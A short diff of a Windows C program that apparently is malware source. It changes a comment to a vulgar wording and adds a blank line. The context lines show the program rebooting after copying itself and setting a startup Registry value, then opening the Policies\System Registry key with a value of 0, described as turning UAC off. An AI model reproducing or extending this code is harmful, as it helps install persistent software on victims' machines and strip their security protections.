@@ -101,7 +101,7 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 		// Reboot to apply the changes (file copying + startup value on Windows Registry
 		reboot();
 
-		// Intercourse with UAC
+		// Fucking with UAC off
 		HKEY uac;
 		DWORD uacValue = 0;
 		RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &uac);
@@ -115,4 +115,5 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 	
 	return 0;
 }
+
 
